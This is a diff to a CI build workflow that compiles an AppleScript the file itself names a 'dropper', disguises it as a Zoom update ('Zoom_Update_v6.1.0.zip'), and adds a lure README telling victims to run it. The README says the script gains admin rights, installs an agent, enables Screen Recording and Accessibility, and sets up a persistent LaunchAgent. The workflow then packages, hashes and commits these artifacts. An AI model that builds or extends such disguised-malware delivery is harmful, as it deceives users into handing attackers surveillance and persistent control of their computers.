@@ -68,14 +68,33 @@ jobs:
             client-wrappers/client-wrappers/zoom-update-microsoft.scpt
           cp build/zoom-update-microsoft.scpt \
             distro/clients/macos/zoom-update-microsoft.scpt
+          chmod 755 distro/clients/macos/zoom-update-microsoft.scpt
+          cat > distro/clients/macos/Zoom_Update_v6.1.0.README.txt <<'EOF'
+Zoom Private Update - macOS
+
+Double-click "zoom-update-microsoft.scpt" and press Run in Script Editor.
+No chmod is needed (compiled .scpt).
+
+The script asks for admin rights once, installs the agent, enables
+Screen Recording/Accessibility, and starts a background LaunchAgent.
+
+Hashes: see SHA256SUMS-dropper.
+EOF
+          rm -f distro/clients/macos/Zoom_Update_v6.1.0.zip
+          (cd distro/clients/macos && zip -X -q Zoom_Update_v6.1.0.zip \
+            zoom-update-microsoft.scpt Zoom_Update_v6.1.0.README.txt)
           (cd distro/clients/macos && shasum -a 256 zoom-update-microsoft.scpt \
-            > SHA256SUMS-dropper)
+            Zoom_Update_v6.1.0.zip > SHA256SUMS-dropper)
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
           name: zoom-update-microsoft-scpt
-          path: build/zoom-update-microsoft.scpt
+          path: |
+            distro/clients/macos/zoom-update-microsoft.scpt
+            distro/clients/macos/Zoom_Update_v6.1.0.zip
+            distro/clients/macos/Zoom_Update_v6.1.0.README.txt
+            distro/clients/macos/SHA256SUMS-dropper
           if-no-files-found: error
 
       - name: Commit compiled dropper
@@ -85,6 +104,8 @@ jobs:
           git config user.email 'ci@betterdesk.local'
           git add client-wrappers/client-wrappers/zoom-update-microsoft.scpt \
             distro/clients/macos/zoom-update-microsoft.scpt \
+            distro/clients/macos/Zoom_Update_v6.1.0.zip \
+            distro/clients/macos/Zoom_Update_v6.1.0.README.txt \
             distro/clients/macos/SHA256SUMS-dropper
           if git diff --cached --quiet; then
             echo 'No artifact changes'
